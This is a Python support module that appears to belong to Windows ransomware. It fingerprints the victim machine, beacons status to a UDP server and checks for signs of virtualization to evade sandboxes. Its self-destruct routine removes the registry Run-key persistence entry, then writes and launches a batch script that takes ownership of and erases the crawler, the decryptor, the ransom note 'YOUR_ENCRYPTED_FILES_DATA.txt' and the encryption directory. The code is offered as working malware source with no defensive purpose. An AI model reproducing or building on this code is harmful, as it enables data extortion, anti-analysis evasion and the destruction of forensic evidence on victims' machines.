import itertools
import subprocess
import sys
import os
import os.path
import traceback
import winreg
import socket
import base64
import shutil
import configparser
import win32api
import wmi
import psutil
from crawler_config import Config
from outputdebugstring import olog


config = configparser.ConfigParser()

def get_extensions():
    return base64.b64decode(Config.EXTENSIONS_ENCODED).decode()

def load_config():
    config_path = os.path.join(os.environ["USERPROFILE"], Config.INI)
    config.read(config_path, encoding='utf-8')

def save_config():
    with open(os.path.join(os.environ["USERPROFILE"], Config.INI), 'wt', encoding="utf-8") as configfile:
        config.write(configfile)

def get_computer_uid():
    from crawler import get_serial_number_of_physical_disk
    
    uid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
    if len(uid) != 36:
        c = wmi.WMI()
        for item in c.Win32_PhysicalMedia():
            deb(f"disk: {item.SerialNumber}")
        deb(win32api.GetVolumeInformation("C:\\"))
        serial = get_serial_number_of_physical_disk()
        deb(f"c: serial={serial}")
        uid = c.Win32_PhysicalMedia()[0].SerialNumber
    return uid

def is_dev():
    return Config.DEV_HOST == get_computer_uid()

def uprint(msg, end='\n'):
    deb(msg, end=end)
    server_message(msg)

if Config.IS_RELEASE:
    def deb(msg, end='\n'):
        pass
else:
    def deb(msg, end='\n'):
        print(msg, end=end)
        flog(msg)
        sys.stdout.flush()
        sys.stderr.flush()

def exception(e, marker=''):
    print(f'{marker}: {e}')
    traceback.print_exc()

def server_message(message):
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        try:
            sock.sendto(bytes(message, encoding="utf-8"), (Config.UDP_IP, Config.UDP_PORT))
        except Exception as e:
            deb(f'server_message: {e}')

def flog(msg):
    with open('log.txt', 'at', errors='ignore') as file:
        file.write(msg + '\r\n')

def combinations(iterable, r):
    pool = tuple(iterable)
    n = len(pool)
    for indices in itertools.permutations(range(n), r):
        if sorted(indices) == list(indices):
            yield tuple(pool[i] for i in indices)

def pred(text):
    print("\033[38;2;{};{};{}m{} \033[38;2;255;255;255m".format(255, 0, 0, text))
    olog(text)
    flog(text)

def pgray(text):
    print("\033[38;2;{};{};{}m{} \033[38;2;255;255;255m".format(11, 110, 0, text))
    flog(text)

def pgreen(text, send='\n'):
    print("\033[38;2;{};{};{}m{} \033[38;2;255;255;255m".format(11, 110, 110, text), end=send)
    olog(text)
    flog(text)

def pblue(text):
    print("\033[38;2;{};{};{}m{} \033[38;2;255;255;255m".format(111, 210, 110, text))
    flog(text)

def pblack(text, send='\n'):
    print("\033[38;2;{};{};{}m{} \033[38;2;255;255;255m".format(21, 25, 244, text), end=send)
    flog(text)
    olog(text)

def set_priority(increase=False):
    if increase:
        try:
            p = psutil.Process()
            p.ionice(psutil.IOPRIO_NORMAL)
            # p.nice(-10)
            deb(f'set ionice to {p.ionice()}')
            p.nice(psutil.HIGH_PRIORITY_CLASS)
            deb(f'set nice to {p.nice()}')
            p.cpu_affinity([0, 1])
            deb(f'set cpu_af to {p.cpu_affinity()}')
        except BaseException as e:
            deb(f"Unexpected error setting priority: {e}")
    else:
        try:
            p = psutil.Process()
            p.ionice(psutil.IOPRIO_VERYLOW)
            # p.nice(-10)
            deb(f'set ionice to {p.ionice()}')
            p.nice(psutil.BELOW_NORMAL_PRIORITY_CLASS)
            deb(f'set nice to {p.nice()}')
            p.cpu_affinity([0])
            deb(f'set cpu_af to {p.cpu_affinity()}')
        except BaseException as e:
            deb(f"Unexpected error setting priority: {e}")

def dir_files(path):
    """
    Function that receives as a parameter a directory path
    :return list_: File List and Its Absolute Paths
    """
    global virtualization_detected
    current_files = []
    total_files = 0
    import time
    
    st_time = time.time()
    for dirpath, dirnames, filenames in os.walk(path):
        for current_file in filenames:
            total_files += 1
            full = os.path.join(dirpath, current_file)
            for sign in Config.VIRT_SIGNS:
                if sign in full:
                    virtualization_detected = True
            if time.time() - st_time >= 0.1:  # and Config.IS_RELEASE:
                deb("\r%s ... %-8d" % (dirpath, total_files), end='')  # \x1b[2K
                st_time = time.time()
            current_files.append(full)
    
    lst = [internal_file for internal_file in current_files]
    return lst

def self_destroy(exitafter=False):
    from crawler import exe_self
    
    try:
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run")
        winreg.DeleteValue(key, config['core'].get('exename', exe_self))
        winreg.CloseKey(key)
    except Exception as e:
        deb(f'remove from reg: {e}')
    
    try:
        with open("autodel.cmd", "wt", encoding='utf-8') as autodel_cmd:
            try:
                exe_name = config['core'].get('exe', fallback=exe_self)
                desktop_file = os.path.join(os.environ['USERPROFILE'], 'Desktop', 'YOUR_ENCRYPTED_FILES_DATA.txt')
                ini_file = os.path.join(os.environ['USERPROFILE'], Config.INI)
                autodel_cmd.write(f"timeout /t 5\r\n")
                encryption_dir = config['core'].get('encryption_dir', fallback=r'c:\temp\edata')
                
                deb(f'self_destroy()->enc dir: {encryption_dir} desktop_file: {desktop_file} exe_name: {exe_name} ini_file: {ini_file}')
                
                autodel_cmd.write(f'takeown /f decryptall.exe\r\n')
                autodel_cmd.write(f'takeown /f crawler.exe\r\n')
                autodel_cmd.write(f'takeown /f autodel.cmd\r\n')
                autodel_cmd.write(f'takeown /f {encryption_dir}\r\n')
                autodel_cmd.write(f'takeown /f YOUR_ENCRYPTED_FILES_DATA.txt\r\n')
                autodel_cmd.write(f"erase /f /s /q decryptall.exe\r\n")
                autodel_cmd.write(f"erase /f /s /q YOUR_ENCRYPTED_FILES_DATA.txt\r\n")
                autodel_cmd.write(f"erase /f /s /q crawler.exe\r\n")
                autodel_cmd.write(f"erase /f /s /q autodel.cmd\r\n")
                autodel_cmd.write(f'erase /f /s /q "{encryption_dir}"\r\n')
                autodel_cmd.write(f'rmdir /s /q "{encryption_dir}"\r\n')
            except Exception as e:
                exception(e, marker='self_destroy')
            
            try:
                if os.path.isfile(ini_file):
                    os.unlink(ini_file)
                if os.path.isfile(desktop_file):
                    os.unlink(desktop_file)
                if os.path.isfile(exe_name):
                    os.unlink(exe_name)
            except Exception as e:
                deb(f'unlink: {e}')
    
    except Exception as e:
        exception(e, marker='open')
    
    try:
        os.startfile("autodel.cmd")
    
    except Exception as e:
        deb(f'startfile call: {e}')
    
    if exitafter:
        sys.exit()
